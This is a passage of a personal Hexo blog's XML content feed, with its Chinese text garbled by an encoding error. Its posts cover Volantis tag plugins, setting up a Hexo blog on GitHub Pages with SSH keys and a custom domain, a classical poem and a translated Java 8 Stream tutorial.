class="url">https://www.sizaif.com/2021/08/08/py%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E5%8E%BB%E9%99%A4hexo%E6%A0%87%E7%AD%BE%E6%8F%92%E4%BB%B6%E8%AF%AD%E6%B3%95/</p></div></a></div></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç«™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Volantis 5.0 æ ‡ç­¾æ’ä»¶</title>
      <link href="/posts/e55b6fd4/"/>
      <url>/posts/e55b6fd4/</url>
      
        <content type="html"><![CDATA[<h1>volantis 5.0 æ ‡ç­¾æ’ä»¶</h1><blockquote><p>ä¸ºäº†å…¼å®¹è€ç”¨æˆ·ï¼Œæ—§çš„æ ‡ç­¾æ’ä»¶åœ¨é‡æ„ä¹‹å‰ä¾ç„¶æ²¿ç”¨æ—§çš„æ ¼å¼ï¼Œå³ <strong>command</strong> + <strong>ç©ºæ ¼</strong> ä½œä¸ºå‚æ•°åˆ†éš”ç¬¦ï¼Œè€Œéƒ¨åˆ†æ–°å¢æ ‡ç­¾æ’ä»¶æ˜¯ <strong>ç©ºæ ¼</strong> + <strong>è‹±æ–‡ç«–çº¿</strong> + <strong>ç©ºæ ¼</strong> ï¼Œè¯·æ³¨æ„åŒºåˆ†ã€‚</p><p>æˆ‘ä»¬ä¹Ÿåœ¨æ¢ç´¢å“ªç§åˆ†éš”ç¬¦æ—¢ç®€å•åˆä¸å®¹æ˜“å¼•èµ·å†²çªï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨å¤šç§æ ¼å¼ï¼Œå…·ä½“ä»¥å¯¹åº”æ–‡æ¡£æè¿°ä¸ºå‡†ã€‚</p></blockquote><h2 id="text">text</h2><div class="story post-story"><div class="tabs" id="tab-01"><ul class="nav-tabs"><li class="tab active"><a class="#tab-01-1">æ•ˆæœ</a></li><li class="tab"><a class="#tab-01-2">æºç </a></li></ul><div class="tab-content"><div class="tab-pane active" id="tab-01-1"><p>å¸¦ <u>ä¸‹åˆ’çº¿</u> çš„æ–‡æœ¬ï¼›å¸¦ <emp>ç€é‡å·</emp> çš„æ–‡æœ¬ï¼›å¸¦ <wavy>æ³¢æµªçº¿</wavy> çš„æ–‡æœ¬ï¼›å¸¦ <del>åˆ é™¤çº¿</del> çš„æ–‡æœ¬</p><p>é”®ç›˜æ ·å¼çš„æ–‡æœ¬ï¼š<kbd>âŒ˜</kbd> + <kbd>D</kbd></p><p>å¯†ç æ ·å¼çš„æ–‡æœ¬ï¼š<psw>è¿™é‡Œæ²¡æœ‰éªŒè¯ç </psw></p></div><div class="tab-pane" id="tab-01-2"><pre class="language-none"><code class="language-none">å¸¦ &#123;% u ä¸‹åˆ’çº¿ %&#125; çš„æ–‡æœ¬ï¼›å¸¦ &#123;% emp ç€é‡å· %&#125; çš„æ–‡æœ¬ï¼›å¸¦ &#123;% wavy æ³¢æµªçº¿ %&#125; çš„æ–‡æœ¬ï¼›å¸¦ &#123;% del åˆ é™¤çº¿ %&#125; çš„æ–‡æœ¬é”®ç›˜æ ·å¼çš„æ–‡æœ¬ï¼š&#123;% kbd âŒ˜ %&#125; + &#123;% kbd D %&#125;å¯†ç æ ·å¼çš„æ–‡æœ¬ï¼š&#123;% psw è¿™é‡Œæ²¡æœ‰éªŒè¯ç  %&#125;</code></pre></div></div></div><div class="tag link"><a class="link-card" title="æ ‡ç­¾æ’ä»¶" href="https://volantis.js.org/v5/tag-plugins/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">æ ‡ç­¾æ’ä»¶</p><p class="url">https://volantis.js.org/v5/tag-plugins/</p></div></a></div></div>]]></content>
      
      
      <categories>
          
          <category> å»ºç«™ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç«™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+githubåšå®¢æ­å»º</title>
      <link href="/posts/b4a23979/"/>
      <url>/posts/b4a23979/</url>
      
        <content type="html"><![CDATA[<h1>hexo+githubåšå®¢æ­å»º</h1><h2 id="éœ€æ±‚">éœ€æ±‚</h2><div class="story post-story"><div class='checkbox red checked'><input type="checkbox" checked="checked"/>            <p>å°†æœ¬åœ°åšå®¢å­˜æ”¾åœ¨<code>DropBox</code>äº‘ä¸­</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>ä½¿ç”¨hexoæ„å»ºåšå®¢ç³»ç»Ÿ</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>ä½¿ç”¨githubä½œä¸ºè¿œç¨‹ä»“åº“</p>            </div><div class='checkbox cyan'><input type="checkbox" />            <p>ä½¿ç”¨giteeä½œä¸ºå¤‡ç”¨ä»“åº“</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>ç»‘å®šåŸŸå</p>            </div><div class='checkbox purple checked'><input type="checkbox" checked="checked"/>            <p>æœ¬åœ°ä½¿ç”¨<strong>ssh git</strong>æ–¹å¼æ¨é€</p>            </div></div><h2 id="æ­å»ºæ­¥éª¤">æ­å»ºæ­¥éª¤</h2><div class="story post-story"><h3 id="å®‰è£…å¿…è¦ç¯å¢ƒ">å®‰è£…å¿…è¦ç¯å¢ƒ</h3><pre class="language-yaml" data-language="yaml"><code class="language-yaml">gitwindows10 (éå¿…é¡»)<span class="token key atrule">Hexo</span><span class="token punctuation">:</span> 4.2 ~ 5.x<span class="token key atrule">hexo-cli</span><span class="token punctuation">:</span> 3.1 ~ 4.x<span class="token key atrule">node.js</span><span class="token punctuation">:</span> 12.16 ~ latest <span class="token comment"># æ¨èä½¿ç”¨ LTS ç‰ˆ</span><span class="token key atrule">npm</span><span class="token punctuation">:</span> 6.13 ~ latest</code></pre><p><strong>å®‰è£…node,js:</strong></p><p><a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210808131949.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210808131949.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210808131948508"></p><p><strong>å®‰è£…git:</strong></p><p><a href="https://git-scm.com/">https://git-scm.com/</a></p><p><strong>å®‰è£…node.js å’Œgitåè¿›è¡Œæµ‹è¯•:</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> -v$ <span class="token function">git</span> --version</code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210808133810.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210808133810.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210808133809220"></p><p><strong>å®‰è£…hexo</strong>:</p><blockquote><p>å› ä¸ºæˆ‘å°†blogæ–‡ä»¶å­˜æ”¾åœ¨Dropboxäº‘ä¸­,</p><p>è€ŒDropboxæœ¬åœ°æ–‡ä»¶åœ¨<code>.Dropbox\XXX</code> è‹¥ä¹‹é—´ä½¿ç”¨<code>npm</code>å‘½ä»¤åˆ™ä¼šå‡ºç°æ‰¾ä¸åˆ°åŒ…çš„é—®é¢˜</p></blockquote><p>æˆ‘è¿™é‡Œçš„è§£å†³æ–¹æ³•æ˜¯:</p><ol><li><p>å…ˆåœ¨æ§åˆ¶å°ä½¿ç”¨npm å‘½ä»¤å®‰è£…<code> npm install hexo-cli -g</code></p></li><li><p>å°†ç›®å½•<code>C:\Users\XXX\AppData\Roaming\npm</code> ä¸‹çš„ node_moduleså’Œ hexo*ç›¸å…³çš„æ–‡ä»¶å¤åˆ¶ä¸€ä»½åˆ°<code>.Dropbox\XXX\Blog\</code>ä¸‹</p></li><li><p>åœ¨<code>.Dropbox\XXX\Blog\</code>ä¸‹æ‰“å¼€æ§åˆ¶å°ç»§ç»­æ‰§è¡Œå®‰è£…hexoçš„å‘½ä»¤</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å®‰è£… npm install hexo-cli -g</span><span class="token comment"># æµ‹è¯•ç‰ˆæœ¬</span>$ hexo -v<span class="token comment"># å®‰è£…</span>$ hexo init blog <span class="token operator">&amp;</span> <span class="token builtin class-name">cd</span> blog <span class="token operator">&amp;</span> <span class="token function">npm</span> <span class="token function">install</span><span class="token comment"># æµè§ˆå™¨è®¿é—® localhost:4000 æµ‹è¯• </span>$ hexo server<span class="token comment"># æ­¤æ—¶æœ¬åœ°å®‰è£…hexoå·²å®Œæˆ</span></code></pre><p>hexoæ–‡ä»¶æ ‘:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">.</span>â”œâ”€â”€ _config.yml <span class="token comment"># ç½‘ç«™çš„é…ç½®ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤é…ç½®å¤§éƒ¨åˆ†çš„å‚æ•°ã€‚ </span>â”œâ”€â”€ package.jsonâ”œâ”€â”€ scaffolds <span class="token comment"># æ¨¡ç‰ˆæ–‡ä»¶å¤¹</span>â”œâ”€â”€ <span class="token builtin class-name">source</span>  <span class="token comment"># èµ„æºæ–‡ä»¶å¤¹ï¼Œé™¤ _posts æ–‡ä»¶ï¼Œå…¶ä»–ä»¥ä¸‹åˆ’çº¿_å¼€å¤´çš„æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ä¸ä¼šè¢«ç¼–è¯‘æ‰“åŒ…åˆ°publicæ–‡ä»¶å¤¹</span><span class="token operator">|</span>   â”œâ”€â”€ _drafts <span class="token comment"># è‰ç¨¿æ–‡ä»¶</span><span class="token operator">|</span>   â””â”€â”€ _posts <span class="token comment"># æ–‡ç« Markdowmæ–‡ä»¶ </span>â””â”€â”€ themes  <span class="token comment"># ä¸»é¢˜æ–‡ä»¶å¤¹</span></code></pre><blockquote><p>å¦‚æœé‡åˆ°npm å®‰è£… æŠ¥é”™é—®é¢˜, å°è¯•åˆ é™¤ <code>package-lock.json</code> å†è¯•</p></blockquote><p>hexoå¸¸ç”¨å‘½ä»¤:</p><pre class="language-bash" data-language="bash"><code class="language-bash">hexo<span class="token function">npm</span> <span class="token function">install</span> hexo -g <span class="token comment">#å®‰è£…  </span><span class="token function">npm</span> update hexo -g <span class="token comment">#å‡çº§  </span>hexo init <span class="token comment">#åˆå§‹åŒ–</span>ç®€å†™hexo n <span class="token string">"æˆ‘çš„åšå®¢"</span> <span class="token operator">==</span> hexo new <span class="token string">"æˆ‘çš„åšå®¢"</span> <span class="token comment">#æ–°å»ºæ–‡ç« </span>hexo p <span class="token operator">==</span> hexo publishhexo g <span class="token operator">==</span> hexo generate<span class="token comment">#ç”Ÿæˆ</span>hexo s <span class="token operator">==</span> hexo server <span class="token comment">#å¯åŠ¨æœåŠ¡é¢„è§ˆ</span>hexo d <span class="token operator">==</span> hexo deploy<span class="token comment">#éƒ¨ç½²</span>æœåŠ¡å™¨hexo server <span class="token comment">#Hexo ä¼šç›‘è§†æ–‡ä»¶å˜åŠ¨å¹¶è‡ªåŠ¨æ›´æ–°ï¼Œæ‚¨æ— é¡»é‡å¯æœåŠ¡å™¨ã€‚</span>hexo server -s <span class="token comment">#é™æ€æ¨¡å¼</span>hexo server -p <span class="token number">5000</span> <span class="token comment">#æ›´æ”¹ç«¯å£</span>hexo server -i <span class="token number">192.168</span>.1.1 <span class="token comment">#è‡ªå®šä¹‰ IP</span>hexo clean <span class="token comment">#æ¸…é™¤ç¼“å­˜ ç½‘é¡µæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥å¿½ç•¥æ­¤æ¡å‘½ä»¤</span>hexo g <span class="token comment">#ç”Ÿæˆé™æ€ç½‘é¡µ</span>hexo d <span class="token comment">#å¼€å§‹éƒ¨ç½²</span>ç›‘è§†æ–‡ä»¶å˜åŠ¨hexo generate <span class="token comment">#ä½¿ç”¨ Hexo ç”Ÿæˆé™æ€æ–‡ä»¶å¿«é€Ÿè€Œä¸”ç®€å•</span>hexo generate --watch <span class="token comment">#ç›‘è§†æ–‡ä»¶å˜åŠ¨</span>å®Œæˆåéƒ¨ç½²ä¸¤ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ç›¸åŒçš„hexo generate --deployhexo deploy --generatehexo deploy -ghexo server -gè‰ç¨¿hexo publish <span class="token punctuation">[</span>layout<span class="token punctuation">]</span> <span class="token operator">&lt;</span>title<span class="token operator">></span></code></pre></li></ol><p><strong>å®‰è£…hexoä¸»é¢˜:</strong></p><p>å®‰è£…é€‚åˆè‡ªå·±å£å‘³çš„ä¸»é¢˜</p><h3 id="è®¾ç½®github">è®¾ç½®github</h3><p>github æ–°å»ºä»“åº“,ä»“åº“åç§°ä¸º <strong><a href="http://XXX.github.io">XXX.github.io</a></strong>; XXXä¸ºä½ çš„ç”¨æˆ·å!</p><p>æ³¨æ„é¡¹:</p><pre><code>1. ==ä»“åº“åç§°ä¸­XXXå¿…é¡»ä¸ç”¨æˆ·åå¯¹åº”!!!!==2. æ–¹å¼ä¸º`public`</code></pre><h3 id="è®¾ç½®ä½¿ç”¨sshæ–¹å¼æ¨é€">è®¾ç½®ä½¿ç”¨sshæ–¹å¼æ¨é€</h3><ol><li><p>æŸ¥çœ‹æœ¬åœ°<code>C:\Users\XXX\.ssh</code> ä¸‹æœ‰æ— <code>id_rsa</code>æ ·å¼æ–‡ä»¶</p></li><li><p>è‹¥æ— ,åˆ›å»ºæ–°çš„ssh å¯†é’¥,</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ ssh-keygen -T rsa -C <span class="token string">'githubé‚®ç®±åœ°å€'</span><span class="token comment"># å›è½¦ç»§ç»­, passphrase å¯†ç å¯è¾“å…¥å¯ä¸è¾“</span></code></pre></li><li><p>å¤åˆ¶<code>.ssh</code>ç›®å½•ä¸‹çš„<code>id_rsa.pub</code>ä¸­æ–‡ä»¶å†…å®¹åˆ°github ssh keysç®¡ç†ä¸­</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210808135240.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210808135240.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210808135239587"></p></li><li><p>æµ‹è¯•ssh</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> git@github.com</code></pre><p><strong>è‹¥å‡ºç°: ssh: connect to host <a href="http://github.com">github.com</a> port 22: Connection refused é”™è¯¯</strong></p><p>è§£å†³æ–¹æ³•:</p><ol><li><p><code>XXX\.ssh</code>ç›®å½•ä¸‹åˆ›å»ºconfigæ–‡ä»¶</p></li><li><p>configæ–‡ä»¶ä¸­å†™å…¥ä¸‹é¢çš„ä¿¡æ¯ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">Host github.com  User xxxxx@xx.com<span class="token punctuation">(</span>githubç”¨æˆ·é‚®ç®±<span class="token punctuation">)</span>  Hostname ssh.github.com  PreferredAuthentications publickey  IdentityFile ~/.ssh/id_rsa  Port <span class="token number">443</span></code></pre></li><li><p>å†ä½¿ç”¨<code>ssh git@github.com</code>æµ‹è¯•</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210808135729.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210808135729.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210808135728807"></p></li></ol></li></ol><h3 id="é€‰æ‹©é…ç½®è‡ªå·±çš„hexo-ä¸»é¢˜-å¯é€‰">é€‰æ‹©é…ç½®è‡ªå·±çš„hexo ä¸»é¢˜(å¯é€‰)</h3><p>é€‰æ‹©é€‚åˆè‡ªå·±å£å‘³çš„blogä¸»é¢˜å³å¯</p></div><h2 id="åŸŸåç»‘å®šgithub">åŸŸåç»‘å®šgithub</h2><div class="story post-story"><ol><li><p>åŸŸåè§£æå•†è§£ææ–¹å¼é€‰æ‹©<code>CNAME</code>; ç«™ç‚¹ä¸º: <code>XXX.github.io</code></p></li><li><p>xxx.github.ioä»“åº“ä¸­,settingé€‰é¡¹Pageä¸­é…ç½® Custom domain</p><p>å†…å®¹ä¸ºä½ çš„åŸŸå,saveä¿å­˜</p></li><li><p>blog æ ¹ç›®å½•ä¸‹çš„sourceæ–‡ä»¶ä¸­åˆ›å»º<code>CNAME</code>æ–‡ä»¶ (å¿…é¡»é€‰é¡¹)</p></li></ol><p>å†…å®¹ä¸ºä½ çš„åŸŸå</p><p>ä½œç”¨: é˜²æ­¢æ¯æ¬¡hexoæ¨é€åšå®¢å,åŸŸåè§£æå¤±æ•ˆ,é‡æ–°é…ç½®Custom domain</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç«™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¹ä¸€å¹äº‘ç©ºè°ƒ</title>
      <link href="/posts/bfcf32d/"/>
      <url>/posts/bfcf32d/</url>
      
        <content type="html"><![CDATA[<iframe height="900" width="100%" frameborder="0" scrolling='no' src="https://ac.yunyoujun.cn"></iframe>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸€æ¬¡å»ºç«™</title>
      <link href="/posts/8b3781ae/"/>
      <url>/posts/8b3781ae/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ˜¥æ±ŸèŠ±æœˆå¤œ">æ˜¥æ±ŸèŠ±æœˆå¤œ</h2><div class="story post-story"><p>æ˜¥æ±Ÿæ½®æ°´è¿æµ·å¹³ï¼Œæµ·ä¸Šæ˜æœˆå…±æ½®ç”Ÿã€‚</p><p>æ»Ÿæ»Ÿéšæ³¢åƒä¸‡é‡Œï¼Œä½•å¤„æ˜¥æ±Ÿæ— æœˆæ˜ï¼</p><p>æ±Ÿæµå®›è½¬ç»•èŠ³ç”¸ï¼Œæœˆç…§èŠ±æ—çš†ä¼¼éœ°ï¼›</p><p>ç©ºé‡Œæµéœœä¸è§‰é£ï¼Œæ±€ä¸Šç™½æ²™çœ‹ä¸è§ã€‚</p><p>æ±Ÿå¤©ä¸€è‰²æ— çº¤å°˜ï¼Œçšçšç©ºä¸­å­¤æœˆè½®ã€‚</p><p>æ±Ÿç•”ä½•äººåˆè§æœˆï¼Ÿæ±Ÿæœˆä½•å¹´åˆç…§äººï¼Ÿ</p><p>äººç”Ÿä»£ä»£æ— ç©·å·²ï¼Œæ±Ÿæœˆå¹´å¹´æœ›ç›¸ä¼¼ã€‚</p><p>ä¸çŸ¥æ±Ÿæœˆå¾…ä½•äººï¼Œä½†è§é•¿æ±Ÿé€æµæ°´ã€‚</p><p>ç™½äº‘ä¸€ç‰‡å»æ‚ æ‚ ï¼Œé’æ«æµ¦ä¸Šä¸èƒœæ„ã€‚</p><p>è°å®¶ä»Šå¤œæ‰èˆŸå­ï¼Ÿä½•å¤„ç›¸æ€æ˜æœˆæ¥¼ï¼Ÿ</p><p>å¯æ€œæ¥¼ä¸Šæœˆè£´å›ï¼Œåº”ç…§ç¦»äººå¦†é•œå°ã€‚</p><p>ç‰æˆ·å¸˜ä¸­å·ä¸å»ï¼Œæ£è¡£ç §ä¸Šæ‹‚è¿˜æ¥ã€‚</p><p>æ­¤æ—¶ç›¸æœ›ä¸ç›¸é—»ï¼Œæ„¿é€æœˆåæµç…§å›ã€‚</p><p>é¸¿é›é•¿é£å…‰ä¸åº¦ï¼Œé±¼é¾™æ½œè·ƒæ°´æˆæ–‡ã€‚</p><p>æ˜¨å¤œé—²æ½­æ¢¦è½èŠ±ï¼Œå¯æ€œæ˜¥åŠä¸è¿˜å®¶ã€‚</p><p>æ±Ÿæ°´æµæ˜¥å»æ¬²å°½ï¼Œæ±Ÿæ½­è½æœˆå¤è¥¿æ–œã€‚</p><p>æ–œæœˆæ²‰æ²‰è—æµ·é›¾ï¼Œç¢£çŸ³æ½‡æ¹˜æ— é™è·¯ã€‚</p><p>ä¸çŸ¥ä¹˜æœˆå‡ äººå½’ï¼Œè½æœˆæ‘‡æƒ…æ»¡æ±Ÿæ ‘ã€‚</p></div><h2 id="å¯„è¯­">å¯„è¯­</h2><div class="story post-story"><p><strong>æ„¿æ‰€æœ‰æ—¥æ—¥å¤œå¤œçš„åŠªåŠ›éƒ½èƒ½è¿æ¥æ˜æ—¥çš„åˆå‡çš„å¤ªé˜³</strong></p><p>by sizaif</p><p>2021-08-07  23:38:41</p><h3 id="ä½ å¥½æ˜å¤©">ä½ å¥½æ˜å¤©</h3></div>]]></content>
      
      
      <categories>
          
          <category> æ‚æ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç«™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 Stream æ•™ç¨‹å­¦ä¹ </title>
      <link href="/posts/2180828f/"/>
      <url>/posts/2180828f/</url>
      
        <content type="html"><![CDATA[<h1>Java8 Stream æ•™ç¨‹å­¦ä¹ </h1><blockquote><p>ğŸ˜„ @Auther: sizaif</p><p>ğŸ“† 2021-05-29  20:37:59</p><p>ğŸ”— è½¬è½½ç¿»è¯‘äº <a href="https://winterbe.com/posts/2014/07/31/java8-stream-tutorial-examples/">https://winterbe.com/posts/2014/07/31/java8-stream-tutorial-examples/</a><a href="https://winterbe.com/posts/2014/07/31/java8-stream-tutorial-examples/"></a></p></blockquote><p>[TOC]</p><h2 id="è¯´æ˜">è¯´æ˜</h2><div class="story post-story"><p>è¿™ä¸ªç¤ºä¾‹é©±åŠ¨çš„æ•™ç¨‹æ·±å…¥æ¦‚è¿°äº†Java 8æµã€‚å½“æˆ‘ç¬¬ä¸€æ¬¡è¯»åˆ°<code>Stream </code>APIæ—¶ï¼Œæˆ‘å¯¹å®ƒçš„åå­—æ„Ÿåˆ°å›°æƒ‘ï¼Œå› ä¸ºå®ƒå¬èµ·æ¥ç±»ä¼¼äºJava I/Oä¸­çš„<code>InputStream</code>å’Œ<code>OutputStream</code>ã€‚ä½†æ˜¯Java 8æµæ˜¯å®Œå…¨ä¸åŒçš„ä¸œè¥¿ã€‚Streamæ˜¯<a href="http://en.wikipedia.org/wiki/Monad_(functional_programming)">Monads</a>ï¼Œå› æ­¤åœ¨å°†å‡½æ•°å¼ç¼–ç¨‹å¼•å…¥Javaä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²:</p><blockquote><p>åœ¨å‡½æ•°å¼ç¼–ç¨‹ï¼Œ<code>Monads</code>æ˜¯ä¸€ä¸ªç»“æ„ï¼Œè¡¨ç¤ºè®¡ç®—å®šä¹‰ä¸ºä¸€ç³»åˆ—çš„æ­¥éª¤ã€‚ä¸€ä¸ªå…·æœ‰å•å­ç»“æ„çš„ç±»å‹å®šä¹‰äº†å°†æ“ä½œé“¾èµ·æ¥çš„å«ä¹‰ï¼Œæˆ–å°†è¯¥ç±»å‹çš„å‡½æ•°åµŒå¥—åœ¨ä¸€èµ·ã€‚</p></blockquote><p>æœ¬æŒ‡å—æ•™ä½ å¦‚ä½•ä½¿ç”¨Java 8æµä»¥åŠå¦‚ä½•ä½¿ç”¨ä¸åŒç±»å‹çš„å¯ç”¨æµæ“ä½œã€‚æ‚¨å°†äº†è§£å¤„ç†é¡ºåºä»¥åŠæµæ“ä½œçš„é¡ºåºå¦‚ä½•å½±å“è¿è¡Œæ—¶æ€§èƒ½ã€‚æ›´å¼ºå¤§çš„æµæ“ä½œ<code>reduce</code>ï¼Œ<code>collect</code>å’Œ<code>flatMap</code>å°†è¯¦ç»†ä»‹ç»ã€‚æœ¬æ•™ç¨‹æœ€åå¯¹å¹¶è¡Œæµè¿›è¡Œäº†æ·±å…¥ç ”ç©¶ã€‚</p></div><h2 id="æµæ˜¯å¦‚ä½•å·¥ä½œçš„-How-streams-work">æµæ˜¯å¦‚ä½•å·¥ä½œçš„(How streams work)</h2><div class="story post-story"><p>ä¸€ä¸ªæµè¡¨ç¤ºä¸€ä¸ªå…ƒç´ åºåˆ—ï¼Œå¹¶æ”¯æŒä¸åŒç±»å‹çš„æ“ä½œæ¥å¯¹è¿™äº›å…ƒç´ æ‰§è¡Œè®¡ç®—:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> myList <span class="token operator">=</span>    <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"a1"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"c2"</span><span class="token punctuation">,</span> <span class="token string">"c1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myList    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token operator">::</span><span class="token function">toUpperCase</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// C1</span><span class="token comment">// C2</span></code></pre><p>æµæ“ä½œå¯ä»¥æ˜¯ä¸­é—´æ“ä½œï¼Œä¹Ÿå¯ä»¥æ˜¯ç»ˆç«¯æ“ä½œã€‚ä¸­é—´æ“ä½œè¿”å›ä¸€ä¸ªæµï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸ä½¿ç”¨åˆ†å·é“¾æ¥å¤šä¸ªä¸­é—´æ“ä½œ.ç»ˆç«¯æ“ä½œè¦ä¹ˆä¸ºç©ºï¼Œè¦ä¹ˆè¿”å›éæµç»“æœ.ä¸Šé¢çš„è¿‡æ»¤å™¨ç¤ºä¾‹ä¸­ï¼Œ<code>map</code>å’Œ<code>sorted</code>æ˜¯ä¸­é—´æ“ä½œï¼Œè€Œ<code>forEach</code>æ˜¯ç»ˆç«¯æ“ä½œã€‚æœ‰å…³æ‰€æœ‰å¯ç”¨æµæ“ä½œçš„å®Œæ•´åˆ—è¡¨ï¼Œè¯·å‚é˜…stream Javadocã€‚å¦‚ä¸Šä¾‹ä¸­æ‰€ç¤ºçš„è¿™ç§æµæ“ä½œé“¾ä¹Ÿç§°ä¸ºæ“ä½œç®¡é“ã€‚</p><p>å¤§å¤šæ•°æµæ“ä½œæ¥å—æŸç§ç±»å‹çš„lambdaè¡¨è¾¾å¼å‚æ•°ï¼Œä¸€ä¸ªæŒ‡å®šæ“ä½œç¡®åˆ‡è¡Œä¸ºçš„å‡½æ•°æ¥å£ã€‚å¤§å¤šæ•°æ“ä½œå¿…é¡»æ˜¯æ— å¹²æ‰°å’Œæ— çŠ¶æ€çš„ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€?</p><p>å½“ä¸€ä¸ªå‡½æ•°ä¸ä¿®æ”¹æµçš„åŸºç¡€æ•°æ®æºæ—¶ï¼Œå®ƒå°±æ˜¯<a href="http://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#NonInterference">æ— å¹²æ‰°</a>çš„,ä¾‹å¦‚,åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ²¡æœ‰ä¸€ä¸ª<code>lambdaè¡¨è¾¾å¼</code>é€šè¿‡ä»é›†åˆä¸­æ·»åŠ æˆ–åˆ é™¤å…ƒç´ æ¥ä¿®æ”¹<code>myList</code>ã€‚</p><p>å½“æ“ä½œçš„æ‰§è¡Œæ˜¯ç¡®å®šçš„æ—¶ï¼Œå‡½æ•°å°±æ˜¯<a href="http://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#Statelessness">æ— çŠ¶æ€</a> çš„ï¼Œä¾‹å¦‚ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ²¡æœ‰<code>lambda</code>è¡¨è¾¾å¼ä¾èµ–äºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½æ”¹å˜çš„å¤–éƒ¨ä½œç”¨åŸŸçš„ä»»ä½•å¯å˜å˜é‡æˆ–çŠ¶æ€ã€‚</p></div><h2 id="ä¸åŒç±»å‹çš„æµ-Different-kind-of-streams">ä¸åŒç±»å‹çš„æµ(Different kind of streams)</h2><div class="story 